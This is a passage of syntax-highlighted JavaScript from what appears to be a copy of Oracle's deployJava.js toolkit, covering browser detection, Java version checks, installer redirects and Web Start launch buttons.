class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isWebStartInstalled(<span class=\"string\">\"1.7.0\"</span>) == <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ((<span class=\"keyword\">this</span>.installJRE(<span class=\"string\">\"1.7.0+\"</span>) == <span class=\"literal\">false</span>) || ((<span class=\"keyword\">this</span>.isWebStartInstalled(<span class=\"string\">\"1.7.0\"</span>) == <span class=\"literal\">false</span>))) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> t = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.documentURI) &#123;</span><br><span class=\"line\">                    t = <span class=\"built_in\">document</span>.documentURI</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (t == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    t = <span class=\"built_in\">document</span>.URL</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> o = <span class=\"keyword\">this</span>.getBrowser();</span><br><span class=\"line\">                <span class=\"keyword\">var</span> p;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (o == <span class=\"string\">\"MSIE\"</span>) &#123;</span><br><span class=\"line\">                    p = <span class=\"string\">'&lt;object classid=\"clsid:8AD9C840-044E-11D1-B3E9-00805F499D93\" width=\"0\" height=\"0\"&gt;&lt;PARAM name=\"launchjnlp\" value=\"'</span> + q + <span class=\"string\">'\"&gt;&lt;PARAM name=\"docbase\" value=\"'</span> + t + <span class=\"string\">'\"&gt;&lt;/object&gt;'</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (o == <span class=\"string\">\"Netscape Family\"</span>) &#123;</span><br><span class=\"line\">                        p = <span class=\"string\">'&lt;embed type=\"application/x-java-applet;jpi-version='</span> + <span class=\"keyword\">this</span>.firefoxJavaVersion + <span class=\"string\">'\" width=\"0\" height=\"0\" launchjnlp=\"'</span> + q + <span class=\"string\">'\"docbase=\"'</span> + t + <span class=\"string\">'\" /&gt;'</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.body == <span class=\"string\">\"undefined\"</span> || <span class=\"built_in\">document</span>.body == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"built_in\">document</span>.write(p);</span><br><span class=\"line\">                    <span class=\"built_in\">document</span>.location = t</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> r = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"div\"</span>);</span><br><span class=\"line\">                    r.id = <span class=\"string\">\"div1\"</span>;</span><br><span class=\"line\">                    r.style.position = <span class=\"string\">\"relative\"</span>;</span><br><span class=\"line\">                    r.style.left = <span class=\"string\">\"-10000px\"</span>;</span><br><span class=\"line\">                    r.style.margin = <span class=\"string\">\"0px auto\"</span>;</span><br><span class=\"line\">                    r.className = <span class=\"string\">\"dynamicDiv\"</span>;</span><br><span class=\"line\">                    r.innerHTML = p;</span><br><span class=\"line\">                    <span class=\"built_in\">document</span>.body.appendChild(r)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            createWebStartLaunchButtonEx: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(p, o)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.returnPage == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">this</span>.returnPage = p</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"string\">\"javascript:deployJava.launchWebStartApplication('\"</span> + p + <span class=\"string\">\"');\"</span>;</span><br><span class=\"line\">                <span class=\"built_in\">document</span>.write(<span class=\"string\">'&lt;a href=\"'</span> + n + <span class=\"string\">'\" onMouseOver=\"window.status=\\'\\'; return true;\"&gt;&lt;img src=\"'</span> + <span class=\"keyword\">this</span>.launchButtonPNG + <span class=\"string\">'\" border=\"0\" /&gt;&lt;/a&gt;'</span>)</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            createWebStartLaunchButton: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(p, o)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.returnPage == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">this</span>.returnPage = p</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"string\">\"javascript:if (!deployJava.isWebStartInstalled(&amp;quot;\"</span> + o + <span class=\"string\">\"&amp;quot;)) &#123;if (deployJava.installLatestJRE()) &#123;if (deployJava.launch(&amp;quot;\"</span> + p + <span class=\"string\">\"&amp;quot;)) &#123;&#125;&#125;&#125; else &#123;if (deployJava.launch(&amp;quot;\"</span> + p + <span class=\"string\">\"&amp;quot;)) &#123;&#125;&#125;\"</span>;</span><br><span class=\"line\">                <span class=\"built_in\">document</span>.write(<span class=\"string\">'&lt;a href=\"'</span> + n + <span class=\"string\">'\" onMouseOver=\"window.status=\\'\\'; return true;\"&gt;&lt;img src=\"'</span> + <span class=\"keyword\">this</span>.launchButtonPNG + <span class=\"string\">'\" border=\"0\" /&gt;&lt;/a&gt;'</span>)</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            launch: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"built_in\">document</span>.location = n;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            isPluginInstalled: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"keyword\">this</span>.getPlugin();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (n &amp;&amp; n.jvms) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            isAutoUpdateEnabled: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isPluginInstalled()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.getPlugin().isAutoUpdateEnabled()</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            setAutoUpdateEnabled: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isPluginInstalled()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.getPlugin().setAutoUpdateEnabled()</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            setInstallerType: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.installType = n;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isPluginInstalled()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.getPlugin().setInstallerType(n)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            setAdditionalPackages: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isPluginInstalled()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.getPlugin().setAdditionalPackages(n)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            setEarlyAccess: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.EAInstallEnabled = n</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            isPlugin2: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isPluginInstalled()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.versionCheck(<span class=\"string\">\"1.6.0_10+\"</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.getPlugin().isPlugin2()</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">catch</span>(n) &#123;&#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            allowPlugin: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.getBrowser();</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = (<span class=\"string\">\"Safari\"</span> != <span class=\"keyword\">this</span>.browserName2 &amp;&amp; <span class=\"string\">\"Opera\"</span> != <span class=\"keyword\">this</span>.browserName2);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> n</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            getPlugin: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.refresh();</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.allowPlugin()) &#123;</span><br><span class=\"line\">                    n = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"deployJavaPlugin\"</span>)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> n</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            compareVersionToPattern: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(u, o, q, r)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (u == <span class=\"literal\">undefined</span> || o == <span class=\"literal\">undefined</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> v = <span class=\"string\">\"^(\\\\d+)(?:\\\\.(\\\\d+)(?:\\\\.(\\\\d+)(?:_(\\\\d+))?)?)?$\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> w = u.match(v);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (w != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> t = <span class=\"number\">0</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> x = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p = <span class=\"number\">1</span>; p &lt; w.length; ++p) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ((<span class=\"keyword\">typeof</span> w[p] == <span class=\"string\">\"string\"</span>) &amp;&amp; (w[p] != <span class=\"string\">\"\"</span>)) &#123;</span><br><span class=\"line\">                            x[t] = w[p];</span><br><span class=\"line\">                            t++</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> n = <span class=\"built_in\">Math</span>.min(x.length, o.length);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (r) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p = <span class=\"number\">0</span>; p &lt; n; ++p) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (x[p] &lt; o[p]) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (x[p] &gt; o[p]) &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p = <span class=\"number\">0</span>; p &lt; n; ++p) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (x[p] != o[p]) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (q) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> (x.length == o.length)</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            getBrowser: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.browserName == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> n = navigator.userAgent.toLowerCase();</span><br><span class=\"line\">                    g(<span class=\"string\">\"[getBrowser()] navigator.userAgent.toLowerCase() -&gt; \"</span> + n);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ((n.indexOf(<span class=\"string\">\"msie\"</span>) != -<span class=\"number\">1</span>) &amp;&amp; (n.indexOf(<span class=\"string\">\"opera\"</span>) == -<span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">this</span>.browserName = <span class=\"string\">\"MSIE\"</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">this</span>.browserName2 = <span class=\"string\">\"MSIE\"</span></span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (n.indexOf(<span class=\"string\">\"iphone\"</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">this</span>.browserName = <span class=\"string\">\"Netscape Family\"</span>;</span><br><span class=\"line\">                            <span class=\"keyword\">this</span>.browserName2 = <span class=\"string\">\"iPhone\"</span></span><br><span class=\"line\">                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> ((n.indexOf(<span class=\"string\">\"firefox\"</span>) != -<span class=\"number\">1</span>) &amp;&amp; (n.indexOf(<span class=\"string\">\"opera\"</span>) == -<span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">this</span>.browserName = <span class=\"string\">\"Netscape Family\"</span>;</span><br><span class=\"line\">                                <span class=\"keyword\">this</span>.browserName2 = <span class=\"string\">\"Firefox\"</span></span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (n.indexOf(<span class=\"string\">\"chrome\"</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">this</span>.browserName = <span class=\"string\">\"Netscape Family\"</span>;</span><br><span class=\"line\">                                    <span class=\"keyword\">this</span>.browserName2 = <span class=\"string\">\"Chrome\"</span></span><br><span class=\"line\">                                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (n.indexOf(<span class=\"string\">\"safari\"</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                                        <span class=\"keyword\">this</span>.browserName = <span class=\"string\">\"Netscape Family\"</span>;</span><br><span class=\"line\">                                        <span class=\"keyword\">this</span>.browserName2 = <span class=\"string\">\"Safari\"</span></span><br><span class=\"line\">                                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                        <span class=\"keyword\">if</span> ((n.indexOf(<span class=\"string\">\"mozilla\"</span>) != -<span class=\"number\">1</span>) &amp;&amp; (n.indexOf(<span class=\"string\">\"opera\"</span>) == -<span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">                                            <span class=\"keyword\">this</span>.browserName = <span class=\"string\">\"Netscape Family\"</span>;</span><br><span class=\"line\">                                            <span class=\"keyword\">this</span>.browserName2 = <span class=\"string\">\"Other\"</span></span><br><span class=\"line\">                                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                            <span class=\"keyword\">if</span> (n.indexOf(<span class=\"string\">\"opera\"</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                                                <span class=\"keyword\">this</span>.browserName = <span class=\"string\">\"Netscape Family\"</span>;</span><br><span class=\"line\">                                                <span class=\"keyword\">this</span>.browserName2 = <span class=\"string\">\"Opera\"</span></span><br><span class=\"line\">                                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                                <span class=\"keyword\">this</span>.browserName = <span class=\"string\">\"?\"</span>;</span><br><span class=\"line\">                                                <span class=\"keyword\">this</span>.browserName2 = <span class=\"string\">\"unknown\"</span></span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                        &#125;</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    g(<span class=\"string\">\"[getBrowser()] Detected browser name:\"</span> + <span class=\"keyword\">this</span>.browserName + <span class=\"string\">\", \"</span> + <span class=\"keyword\">this</span>.browserName2)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.browserName</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            testUsingActiveX: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> p = <span class=\"string\">\"JavaWebStart.isInstalled.\"</span> + n + <span class=\"string\">\".0\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> ActiveXObject == <span class=\"string\">\"undefined\"</span> || !ActiveXObject) &#123;</span><br><span class=\"line\">                    g(<span class=\"string\">\"[testUsingActiveX()] Browser claims to be IE, but no ActiveXObject object?\"</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> (<span class=\"keyword\">new</span> ActiveXObject(p) != <span class=\"literal\">null</span>)</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span>(o) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            testForMSVM: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> o = <span class=\"string\">\"&#123;08B0E5C0-4FCB-11CF-AAA5-00401C608500&#125;\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> oClientCaps != <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> n = oClientCaps.getComponentVersion(o, <span class=\"string\">\"ComponentID\"</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ((n == <span class=\"string\">\"\"</span>) || (n == <span class=\"string\">\"5,0,5000,0\"</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            testUsingMimeTypes: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(o)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!navigator.mimeTypes) &#123;</span><br><span class=\"line\">                    g(<span class=\"string\">\"[testUsingMimeTypes()] Browser claims to be Netscape family, but no mimeTypes[] array?\"</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p = <span class=\"number\">0</span>; p &lt; navigator.mimeTypes.length; ++p) &#123;</span><br><span class=\"line\">                    s = navigator.mimeTypes[p].type;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> n = s.match(<span class=\"regexp\">/^application\\/x-java-applet\\x3Bversion=(1\\.8|1\\.7|1\\.6|1\\.5|1\\.4\\.2)$/</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (n != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.compareVersions(n[<span class=\"number\">1</span>], o)) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            testUsingPluginsArray: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(o)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ((!navigator.plugins) || (!navigator.plugins.length)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = navigator.platform.toLowerCase();</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p = <span class=\"number\">0</span>; p &lt; navigator.plugins.length; ++p) &#123;</span><br><span class=\"line\">                    s = navigator.plugins[p].description;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (s.search(<span class=\"regexp\">/^Java Switchable Plug-in (Cocoa)/</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.compareVersions(<span class=\"string\">\"1.5.0\"</span>, o)) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (s.search(<span class=\"regexp\">/^Java/</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (n.indexOf(<span class=\"string\">\"win\"</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.compareVersions(<span class=\"string\">\"1.5.0\"</span>, o) || <span class=\"keyword\">this</span>.compareVersions(<span class=\"string\">\"1.6.0\"</span>, o)) &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.compareVersions(<span class=\"string\">\"1.5.0\"</span>, o)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            IEInstall: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                location.href = <span class=\"keyword\">this</span>.getJavaURL + ((<span class=\"keyword\">this</span>.returnPage != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;returnPage=\"</span> + <span class=\"keyword\">this</span>.returnPage) : <span class=\"string\">\"\"</span>) + ((<span class=\"keyword\">this</span>.locale != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;locale=\"</span> + <span class=\"keyword\">this</span>.locale) : <span class=\"string\">\"\"</span>) + ((<span class=\"keyword\">this</span>.brand != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;brand=\"</span> + <span class=\"keyword\">this</span>.brand) : <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            done: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(o, n)</span> </span>&#123;&#125;,</span><br><span class=\"line\">            FFInstall: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                location.href = <span class=\"keyword\">this</span>.getJavaURL + ((<span class=\"keyword\">this</span>.returnPage != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;returnPage=\"</span> + <span class=\"keyword\">this</span>.returnPage) : <span class=\"string\">\"\"</span>) + ((<span class=\"keyword\">this</span>.locale != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;locale=\"</span> + <span class=\"keyword\">this</span>.locale) : <span class=\"string\">\"\"</span>) + ((<span class=\"keyword\">this</span>.brand != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;brand=\"</span> + <span class=\"keyword\">this</span>.brand) : <span class=\"string\">\"\"</span>) + ((<span class=\"keyword\">this</span>.installType != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;type=\"</span> + <span class=\"keyword\">this</span>.installType) : <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            compareVersions: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(q, r)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> o = q.split(<span class=\"string\">\".\"</span>);</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = r.split(<span class=\"string\">\".\"</span>);</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p = <span class=\"number\">0</span>; p &lt; o.length; ++p) &#123;</span><br><span class=\"line\">                    o[p] = <span class=\"built_in\">Number</span>(o[p])</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p = <span class=\"number\">0</span>; p &lt; n.length; ++p) &#123;</span><br><span class=\"line\">                    n[p] = <span class=\"built_in\">Number</span>(n[p])</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (o.length == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                    o[<span class=\"number\">2</span>] = <span class=\"number\">0</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (o[<span class=\"number\">0</span>] &gt; n[<span class=\"number\">0</span>]) &#123;</span><br><span 